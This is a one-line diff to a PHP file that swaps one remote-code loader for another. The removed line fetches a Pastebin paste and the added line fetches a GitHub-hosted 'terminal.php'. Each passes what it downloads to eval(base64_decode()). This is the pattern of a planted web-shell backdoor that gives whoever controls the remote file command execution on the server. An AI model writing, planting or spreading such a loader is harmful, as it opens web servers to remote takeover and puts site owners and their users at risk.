@@ -1,1 +1,1 @@
-<?php $Izaass = file_get_contents('http://pastebin.com/raw.php?i=RpwiZ8BC'); eval(base64_decode($Izaass)); ?>
+<?php $TrungSky = file_get_contents('https://raw.githubusercontent.com/trungsky/terminalphp/master/terminal.php'); eval(base64_decode($TrungSky)); ?>
